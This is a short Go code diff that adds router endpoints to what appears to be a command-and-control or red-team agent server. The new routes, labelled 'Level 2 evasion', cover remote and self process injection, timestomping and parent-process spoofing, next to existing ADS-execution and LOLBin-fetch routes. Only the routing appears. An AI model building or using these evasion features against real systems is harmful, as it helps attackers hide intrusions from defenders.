@@ -93,6 +93,12 @@ func (r *Router) Setup() *gin.Engine {
 		v1.POST("/agent/:id/ads/exec", r.handlers.ADSExec)
 		v1.POST("/agent/:id/fetch", r.handlers.LOLBinFetch)
 
+		// Level 2 evasion
+		v1.POST("/agent/:id/inject/remote", r.handlers.InjectRemote)
+		v1.POST("/agent/:id/inject/self", r.handlers.InjectSelf)
+		v1.POST("/agent/:id/timestomp", r.handlers.Timestomp)
+		v1.POST("/agent/:id/process/ppid", r.handlers.PPIDSpawn)
+
 		// Monitoring
 		v1.GET("/stats", r.handlers.GetStats)
 		v1.GET("/health", r.handlers.HealthCheck)
